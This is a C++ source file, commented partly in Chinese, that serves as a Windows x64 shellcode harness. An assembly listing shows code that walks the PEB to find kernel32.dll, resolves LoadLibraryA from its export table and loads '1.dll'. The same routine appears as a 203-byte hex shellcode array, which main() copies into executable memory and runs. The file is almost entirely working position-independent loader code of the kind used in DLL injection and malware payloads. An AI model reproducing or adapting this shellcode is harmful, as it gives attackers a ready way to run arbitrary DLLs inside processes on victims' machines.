// ConsoleApplication3.cpp : 定义控制台应用程序的入口点。
//
#include<Windows.h>
#include<stdio.h>
/*
cld
push rbx
push rax
push rcx                    ;kernel32 PE entry
push rdx
push r8
push r9
push r10
mov rbx,gs:[60h]            ;get peb   (x86 在FS寄存器，x64在GS寄存器)
mov rbx,[rbx+18h]           ;get ldr
mov rbx,[rbx+30h]           ;get modulelistfirst ntdll.dll
mov rbx,[rbx]               ;get kernelbase.dll
mov rbx,[rbx]               ;get kernel32.dll
mov rax,[rbx+10h]           ;get baseaddress
mov rcx,rax
mov rbx,[rbx+40h]           ;get basedllname
xor rbx,rbx
mov ebx,[rax+3ch]           ;get e_lfanew
add rax,rbx                 ;get PE header
add rax,88h                 ;get export table RVA address
xor rbx,rbx
mov ebx,[rax]               ;get export table RVA
mov rax,rcx
add rax,rbx                 ;locate in the export table
xor rbx,rbx
mov ebx,[rax+1ch]           ;get RVA of AddressOfFunctions
mov edx,[rax+20h]           ;get RVA of AddressOfNames
mov rax,rcx
add rax,rdx                 ;get AddressOfNames array
xor rdx,rdx
mov r9,rax
xor r10,r10
find_lib:
xor r8,r8
mov rax,r9                  ;r9:addressofnames array
mov edx,[rax+r10*4]         ;r10:sum
mov rax,rcx
add rax,rdx                 ;get func name
inc r10
mov r8w,[rax+8h+2h]
cmp r8w,4179h
jne find_lib
mov r8w,[rax]
cmp r8w,6f4ch
jne find_lib
find_lib_end:
mov rax,rcx
add rax,rbx                 ;get AddressOfFunction array
xor rbx,rbx
dec r10                     ;r10:LoadLibraryA index
mov ebx,[rax+r10*4]         ;get LoadLibraryA Function Rva
mov rax,rcx
add rax,rbx                 ;get LoadLibraryA address
xor rbx,rbx
mov rbx,006c6c642e31h         ;1.dll
sub rsp,10h
mov [rsp],rbx               ;char* a="1.dll"
mov rcx,rsp                 ;__fastcall
call rax                    ;LoadLibraryA("1.dll")
add rsp,10h
pop r10
pop r9
pop r8
pop rdx
pop rcx
pop rax
pop rbx
ret
*/
UCHAR shellcode[203] =
"\xFC"                                     //0
"\x53"                                     //1
"\x50"                                     //2
"\x51"                                     //3
"\x52"                                     //4
"\x41\x50"                                 //6
"\x41\x51"                                 //8
"\x41\x52"                                 //10
"\x65\x48\x8B\x1C\x25\x60\x00\x00\x00"     //19
"\x48\x8B\x5B\x18"                         //23
"\x48\x8B\x5B\x30"                         //27
"\x48\x8B\x1B"                             //30
"\x48\x8B\x1B"                             //33
"\x48\x8B\x43\x10"                         //37
"\x48\x8B\xC8"                             //40
"\x48\x8B\x5B\x40"                         //44
"\x48\x33\xDB"                             //47
"\x8B\x58\x3C"                             //50
"\x48\x03\xC3"                             //53
"\x48\x05\x88\x00\x00\x00"                 //59
"\x48\x33\xDB"                             //62
"\x8B\x18"                                 //64
"\x48\x8B\xC1"                             //67
"\x48\x03\xC3"                             //70
"\x48\x33\xDB"                             //73
"\x8B\x58\x1C"                             //76
"\x8B\x50\x20"                             //79
"\x48\x8B\xC1"                             //82
"\x48\x03\xC2"                             //85
"\x48\x33\xD2"                             //88
"\x4C\x8B\xC8"                             //91
"\x4D\x33\xD2"                             //94
"\x4D\x33\xC0"                             //97
"\x49\x8B\xC1"                             //100
"\x42\x8B\x14\x90"                         //104
"\x48\x8B\xC1"                             //107
"\x48\x03\xC2"                             //110
"\x49\xFF\xC2"                             //113
"\x66\x44\x8B\x40\x0A"                     //118
"\x66\x41\x81\xF8\x79\x41"                 //124
"\x75\xE0"                                 //126
"\x66\x44\x8B\x00"                         //130
"\x66\x41\x81\xF8\x4C\x6F"                 //136
"\x75\xD4"                                 //138
"\x48\x8B\xC1"                             //141
"\x48\x03\xC3"                             //144
"\x48\x33\xDB"                             //147
"\x49\xFF\xCA"                             //150
"\x42\x8B\x1C\x90"                         //154
"\x48\x8B\xC1"                             //157
"\x48\x03\xC3"                             //160
"\x48\x33\xDB"                             //163
"\x48\xBB\x31\x2E\x64\x6C\x6C\x00\x00\x00" //173
"\x48\x83\xEC\x10"                         //177
"\x48\x89\x1C\x24"                         //181
"\x48\x8B\xCC"                             //184
"\xFF\xD0"                                 //186
"\x48\x83\xC4\x10"                         //190
"\x41\x5A"                                 //192
"\x41\x59"                                 //194
"\x41\x58"                                 //196
"\x5A"                                     //197
"\x59"                                     //198
"\x58"                                     //199
"\x5B"                                     //200
"\xC3";                                    //201



 

typedef void(*CODE)(void);
int main()
{
	/*printf("%x", (unsigned long)&((IMAGE_DOS_HEADER*)(0))->e_lfanew - (unsigned long)&((IMAGE_DOS_HEADER*)(0))->e_magic);*/
	/*printf("%x", (unsigned long)&((IMAGE_EXPORT_DIRECTORY *)(0))->AddressOfNames - (unsigned long)&((IMAGE_EXPORT_DIRECTORY *)(0))->Characteristics);*/
    CODE code;
	PVOID buf = VirtualAlloc(NULL, 1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(buf, shellcode,sizeof(shellcode));
	code = (CODE)buf;
	code();
}